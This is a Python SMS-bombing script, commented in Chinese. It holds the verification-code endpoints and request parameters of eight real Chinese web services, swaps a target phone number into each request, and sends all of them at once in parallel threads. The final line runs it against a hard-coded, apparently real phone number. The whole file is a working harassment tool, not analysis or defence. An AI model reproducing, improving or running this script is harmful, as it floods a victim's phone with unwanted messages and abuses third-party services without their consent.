import urllib
import sys
from urllib import parse,request 

def param_encode(param):  #将dict类型的参数转为post/get参数字符串
  ret=""
  for key in param:
    if len(ret)>0 :
      ret+="&"
    ret+=key+"="+param[key]
  return ret
  
interface=[  #将url/或post参数中的 __PHONE__改为要发送到手机号
  {
    "name"  : "一号货车",
    "url"   : "http://webapi.yihaohuoche.com/app/1.8/Account.svc/GetValidationCodeV3",
    "method": "POST",
    "param" : param_encode({
           "sigurature"   : "348df98881778a8c18412c2d87f010c9",
           "usertype" : "1",
           "source"  : "%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C",
           "clienttype" : "131073",
           "deviceid"  : "Vg%s2Fgu1aRRfwDADyju1hiFQhl" %(chr(0xd)+chr(0xd)+chr(0xa)+chr(0x25)),
           "phonenumber":"__PHONE__"
    }),
    "headers": {
    }
  },
  {
    "name"  : "赛客",
    "url"   : "http://www.saike.com/ucenter/index.php?c=login&m=sendMesToMobileAddImg",
    "method": "POST",
    "param" : param_encode({ 
           "phone"  : "__PHONE__",
           "code":"1111"
    }),
    "headers": { 
    }
  }, 
  {
    "name"  : "国家教育资源平台",
    "url"   : "http://n.eduyun.cn/index.php?r=portal/register/getActCode",
    "method": "POST",
    "param" : param_encode({ 
           "phone"  : "__PHONE__"
    }),
    "headers": { 
    }
  }, 
  {
    "name"  : "嗨养修车",
    "url"   : "http://m.hiservice.com.cn/api/index?model=api",
    "method": "POST",
    "param" : param_encode({ 
           "mobile"  : "__PHONE__",
           "type"    : "login",
           "action"  : "sendCheckCode",
           "lgjcd"   : "lu"
    }),
    "headers": {
    }
  }, 
  {
    "name"  : "我厨生鲜",
    "url"   : "http://wmall.wochu.cn/client/v1/member/sendSMS?parameters={%22mobile%22:%22__PHONE__%22}",
    "method": "GET",
    "headers": {
    }
  }, 
  {
    "name"  : "PPTV",
    "url"   : "http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName=__PHONE__",
    "method": "GET",
    "headers": {
    }
  },{
    "name"  : "高顿网校",
    "url"   : "http://v.gaodun.com/Member/sendmsg",
    "url2"  : "http://v.gaodun.com/Member/register/st/w",
    "method": "POST",
    "param" : param_encode({ 
           "phone"  : "__PHONE__",
           "type"   : "1"
    }),
    "headers": {
    },
    "byJSON":False
  },
  {
    "name"  : "南航明珠俱乐部",
    "url"   : "http://skypearl.csair.com/skypearl/cn/quickEnrollSendAuth.action",
    "url2"  : "http://skypearl.csair.com/skypearl/cn/toQuickEnroll.action",
    "method": "POST",
    "param" : param_encode({ 
           "contactNum"    : "__PHONE__",
           "contactType"   : "PHONE",
           "countryCode"   : "86"
    }),
    "headers": {
    },
    "byJSON":False
  }
];

common_hdrs={
   "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
   "Accept"    :"*/*",
   "Connection":"Keep-Alive"
};
def show(a,gap):
    print(len(a))
    for i in range(gap):
      print(" ",end="")    
    for i in range(0+gap,len(a)+gap):
      ed=""
      if i%16==15:
        ed="\n"
      if i%16==7:
        ed=" "
      print("%s" %(a[i-gap]),end=ed)
    sys.exit(0)
def send(info,phone): 
    print("[*]正在调用[%s]的短信接口..." %(info["name"]))
    #设置Headers
    hdrs=common_hdrs
    hdrs["Referer"]=info["url"]
    for key in info["headers"]:
      hdrs[key]=info["headers"][key] 
    #POST方法
    if info["method"]=="POST":
      #将phone修改成我们的phone
      post_data = info["param"].replace("__PHONE__",phone) 
      print(post_data)
      #show(post_data,13)
      try:
        req=urllib.request.Request(info["url"],post_data.encode("utf-8"),hdrs)
        resp=urllib.request.urlopen(req)
        print(resp.read().decode())
        #x=json.loads(resp.read().decode())
        #print(x)
      except Exception as e:
        do_nothing=""
        print(e);
    else:
      url=info["url"].replace("__PHONE__",phone)
      #print(url)
      try:
        resp=urllib.request.urlopen(url)
      except Exception as e:
        do_nothing=""
      print(resp.read().decode()) 
import threading
def send_all(phone):
    threads=[]
    for info in interface:
      threads.append(threading.Thread(target=send,args=(info,phone,)))
    for t in threads:
      t.start()
    for t in threads:
      t.join()

send_all("13950069649")